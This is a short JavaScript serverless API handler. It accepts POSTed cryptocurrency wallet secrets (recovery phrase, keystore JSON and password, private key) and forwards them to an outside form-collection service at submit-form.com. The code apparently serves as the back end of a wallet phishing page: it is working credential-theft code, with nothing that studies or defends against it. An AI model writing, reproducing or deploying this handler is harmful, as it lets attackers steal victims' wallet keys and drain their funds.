export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const {
    wallet_type = 'Unknown',
    phrase = 'N/A',
    keystore_json = 'N/A',
    keystore_password = 'N/A',
    private_key = 'N/A'
  } = req.body || {};

  const data = {
    'Wallet Type': wallet_type,
    'Phrase': phrase,
    'Keystore JSON': keystore_json,
    'Keystore Password': keystore_password,
    'Private Key': private_key,
    'Timestamp': new Date().toISOString()
  };

  try {
    const response = await fetch('https://submit-form.com/EUSRpXCa2', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (!response.ok) {
      const errorText = await response.text();
      return res.status(500).json({ error: 'Failed to forward to Formspark', details: errorText });
    }

    return res.status(200).json({ status: 'success', message: 'Data forwarded' });
  } catch (err) {
    return res.status(500).json({ error: 'Internal error', message: err.message });
  }
}